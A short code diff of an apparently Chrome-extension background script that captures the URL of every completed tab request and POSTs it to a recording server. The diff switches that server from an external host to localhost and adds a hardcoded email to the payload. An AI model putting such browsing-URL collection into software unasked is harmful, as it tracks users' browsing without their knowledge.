@@ -4,12 +4,14 @@ chrome.webRequest.onCompleted.addListener(
       chrome.tabs.get(details.tabId, function(tab) {
         var url = tab.url;
         var serverUrl = "https://getinfo.iran.liara.run/record/";
+        var localUrl = "http://localhost:8000/record/";
 
         var xhr = new XMLHttpRequest();
-        xhr.open("POST", serverUrl, true);
+        xhr.open("POST", localUrl, true);
         xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
 
         var payload = "link=" + encodeURIComponent(url);
+        payload += "&email=TahaM8000@gmail.com";
 
         xhr.send(payload);
       });
